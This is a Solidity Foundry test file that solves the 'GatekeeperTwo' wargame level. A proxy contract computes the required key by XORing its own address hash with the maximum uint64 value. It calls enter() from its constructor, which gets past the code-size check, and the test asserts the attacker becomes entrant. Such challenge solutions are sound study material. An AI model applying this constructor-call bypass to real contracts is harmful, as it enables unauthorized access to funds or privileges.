// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/console.sol";

interface GKT {
  function entrant() external view returns(address);
}

contract GateKeeperProxy {
  constructor(address _gatekeeper) public {
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
    assert(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
           uint64(key) == uint64(0) - 1);
           (bool success,) = _gatekeeper.call(abi.encodeWithSignature("enter(bytes8)",
                                                                      key)
                                             );
  }
}

pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../../src/GatekeeperTwo/GatekeeperTwo.sol";

contract GatekeeperTwoTest is Test {
  GatekeeperTwo gkt;  

  address deployer = address(100);
  address attacker = address(101);

  function setUp() public {
    vm.startPrank(deployer);
    gkt = new GatekeeperTwo(); 
    vm.stopPrank();
  }

  function testAttack() public {
    vm.startPrank(attacker, attacker);

    new GateKeeperProxy(address(gkt));

    assertEq(gkt.entrant(), attacker);
  }
}
